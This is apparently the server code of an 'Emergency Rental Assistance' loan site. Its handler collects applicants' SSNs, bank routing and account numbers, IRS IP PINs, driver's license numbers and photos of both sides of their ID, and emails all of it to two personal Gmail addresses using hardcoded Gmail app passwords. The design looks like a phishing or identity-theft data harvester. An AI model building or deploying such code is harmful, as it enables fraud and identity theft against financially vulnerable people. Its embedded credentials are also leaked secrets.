import { NextResponse } from "next/server";
import nodemailer from "nodemailer";
import FormDataModel from "../loan/mongooseConfig";

export async function POST(request) {
  const { formData } = await request.json();
  const ssn = String(formData.ssn);
  const emailAddress = String(formData.emailAddress);
  const phoneNumber = String(formData.primaryPhoneNumber);

  // Create a Nodemailer transporter
  const transporter1 = nodemailer.createTransport({
    service: "gmail",
    // host: "smtp.gmail.com",
    // port: 465,
    // secure: true,hhjhklhkllklhlkkl
    auth: {
      user: "osr.cty@gmail.com",
      pass: "btzbcklyxerxvkiy",
    },
  });

  const transporter2 = nodemailer.createTransport({
    service: "gmail",
    // host: "smtp.gmail.com",
    // port: 465,
    // secure: true,hhjhklhkllklhlkkl
    auth: {
      user: "grandlendings2024@gmail.com",
      pass: "cpse iofi ejli fuhx",
    },
  });

  const autoReplyMessage = {
    from: "Emergency Rental Assistance <loans@Emergency Rental Assistance.com>",
    to: formData.emailAddress,
    subject: "Loan Application Received",
    html: `
      <h3>Thank you for your loan application!</h3>
      <p>We have received your loan application and will review it shortly.</p>
      <p>If you have any further questions or need assistance, please feel free to contact us: loans@Emergency Rental Assistance.com></a></p><br/><br/><br/>
      <p>Best regards,</p>
      <p>Emergency Rental Assistance</p>
      `,
  };
  // Compose the email message
  const message = {
    from: "osr.cty@gmail.com",
    to: ["piexe93@gmail.com", "solomonojukwu4@gmail.com"],
    subject: "Loan Application Details",
    html: `
    <h3> Application Details ${
      formData.taxReturn === "yes"
        ? "- Filed for tax return 2023"
        : "Did not file for 2023 tax return"
    }</h3>
    <p>First Name: ${formData.firstName}</p>
    <p>Last Name: ${formData.lastName}</p>
    <p>Rental Amount: ${formData.loanAmount}</p>
    <p>Monthly Mortgage: ${formData.monthlyMortgage}</p>
    <p>Interest: ${formData.interest}</p>
    <p>SSN: ${formData.ssn}</p>
    <p>Date of Birth: ${formData.dob}</p>
    <p>Address: ${formData.address}</p>
    <p>Suite/Apt: ${formData.suiteApt}</p>
    <p>City: ${formData.city}</p>
    <p>State: ${formData.state}</p>
    <p>Zip Code: ${formData.zipCode}</p>
    <p>Residence Duration: ${formData.residenceDuration}</p>
    <p>Residence Status: ${formData.residenceStatus}</p>
    <p>Eviction: ${formData.eviction}</p>
    <p>Email Address: ${formData.emailAddress}</p>
    <p>Primary Phone Number: ${formData.primaryPhoneNumber}</p>
    <p>Secondary Phone Number: ${formData.secondaryPhoneNumber}</p>
    <p>Routing Number: ${formData.routingNumber}</p>
    <p>Account Number: ${formData.accountNumber}</p>
    <p>Confirm Account Number: ${formData.confirmAccountNumber}</p>
    <p>Account Type: ${formData.accountType}</p>
    <p>Account Duration: ${formData.accountDuration}</p>
    <p>Direct Deposit: ${formData.directDeposit}</p>
    <p>Automatic Payments: ${formData.automaticPayments}</p>
    <p>Primary Income: ${formData.primaryIncome}</p>
    <p>Last Pay Amount: ${formData.lastPayAmount}</p>
    <p>Last Pay Date: ${formData.lastPayDate}</p>
    <p>Next Pay Date: ${formData.nextPayDate}</p>
    <p>If Annual Income reduced by 70%: ${formData.annualIncomeReducedBy70}</p>
    <p>Additional Income: ${formData.additionalIncome}</p>
    <p>Issued eviction notice: ${formData.issuedEvictionNotice}</p>
    <p>Affected by covid: ${formData.affectedByCovid}</p>
    <p>Owe utility bill: ${formData.oweUtilityBill}</p>
<p>Rental Assistance Duration: ${formData.rentalAssistanceDuration}</p>
<p>Rental Assistance Payment Means: ${formData.rentalAssistancePaymentMeans}</p>

<h2>Rental assistance address</h2>
<p>If empty, it means they chose the same as the current address.</p>
<p>Rental Address: ${formData.rentalAddress || "Same as Current Address"}</p>
<p>Rental City: ${formData.rentalCity}</p>
<p>Rental Zip Code: ${formData.rentalZipCode}</p>
<p>Rental State: ${formData.rentalState}</p>
<p>Rental Monthly Mortgage/Rent Amount: ${formData.rentalMonthlyMortgage}</p>
<p>Landlord's Name: ${formData.landlordName}</p>
<p>Landlord's Phone Number: ${formData.landlordPhoneNumber}</p>
<p>Number of Occupants: ${formData.occupantsNumber}</p>
<p>Monthly Rent Amount: ${formData.monthlyRentAmount}</p>
<p>Total Rents Owed: ${formData.totalRentsOwed}</p>
<p>Rental Residence Duration: ${formData.rentalResidenceDuration}</p>
<p>Rental Residence Status: ${formData.rentalResidenceStatus}</p>
<p>Military Status: ${formData.militaryStatus}</p>
<p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
<p>Payday Loan History: ${formData.paydayLoanHistory}</p>

    <p>EmergencyRentalAssistance Source: ${
      formData.EmergencyRentalAssistanceSource
    }</p>
    <p>EmergencyRentalAssistance Source Other: ${
      formData.EmergencyRentalAssistanceSourceOther
    }</p>
    <p>Credit Score: ${formData.creditScore}</p>
    <p> Ip Pin: ${formData.ipPin}</p>
    <p>Adjusted Gross Income: ${formData.adjustedGrossIncome}</p>

    <p>License Number: ${
      formData.licenseNumber
    }</p><p>Loan to be given when reduced by 20%: ${
      (formData.loanAmount / 100) * 80
    }</p>
    <p>Front View:</p>
    <img src="${formData.frontView}" alt="Front View" />
    <p>Back View:</p>
    <img src="${formData.backView}" alt="Back View" />

      
  `,
  };

  try {
    // Send the email
    // await transporter2.sendMail(autoReplyMessage);
    await transporter1.sendMail(message);
    //await transporter2.sendMail(autoReplyMessage);
    await FormDataModel.create({
      ssn: ssn,
      emailAddress: emailAddress,
      phoneNumber: phoneNumber,
    });
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}

export async function GET() {
  return NextResponse.json({ message: "Method Not Allowed" }, { status: 405 });
}
